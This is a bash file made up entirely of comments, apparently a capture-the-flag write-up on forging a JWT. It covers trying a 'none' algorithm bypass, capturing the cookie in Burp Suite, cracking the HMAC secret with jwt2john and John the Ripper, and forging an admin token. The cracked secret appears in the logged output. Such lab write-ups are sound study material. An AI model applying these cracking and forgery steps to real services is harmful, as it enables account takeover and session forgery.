#!/bin/bash

# A JWT token is split into 3 Base64 encoded parts, separated by a dot.
# For an example token and an interactive token validator visit:
# https://jwt.io/
#
# Initially, I thought it would be a "none" alg exploit where I can skip the
# validation altogether, passing only <header>.<payload>.<this part blank>
# but it didn't work - I wanted to forge a token with username='admin'.
# I tested this by opening the page in Burp Suite, toggling proxy and intercepting
# requests. I copied the cookie sent back by the server for further use with this method.
# Note: Clear cookies if stuck.
#
# Because there's a link to "John" cracker on the main page,
# it is a strong hint that the signature secret could be easily cracked.
#
# At this point, I had to download a community-ran version of John (John the Ripper jumbo):
# https://github.com/openwall/john
#
# After installation, download jwtcrack to convert the hex-encoded signature to a format that jumbo-John accepts:
# git clone https://github.com/Sjord/jwtcrack
# cd jwtcrack/jwtcrack
# echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSm9obiJ9.K1Omo0Gk5saKwJTkkgT7PUZohD7USknEE0lmT2AYAiM > hash
# ./jwt2john.py $(cat hash) > hash.john
# john hash.john
#
# Now, as you have the secret, use it to forge an admin JWT on jwt.io
#
#

################  Notes:
# Bug bounty bootcamp - Page 41
# https://medium.com/@phosmet/forging-jwt-exploiting-the-none-algorithm-a37d670af54f
# https://shauryasharma05.medium.com/cracking-jwt-signature-90fd444fe494
# You can (have to?) omit the padding '=' part for each part of the JWT signature:
#   https://community.auth0.com/t/why-no-equal-signs-at-the-end-of-base-64-encoding/87853
#
# To display cracked passwords, use "john --show" on your password hash file(s).
# To force John to crack those same hashes again, remove the john.pot file.
#
#
#➜  ~/dev/ctf/toolbox/jwtcrack john hash.john
#Using default input encoding: UTF-8
#Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
#No password hashes left to crack (see FAQ)
#➜  ~/dev/ctf/toolbox/jwtcrack john hash.john --show
#?:ilovepico
#
#1 password hash cracked, 0 left
#➜
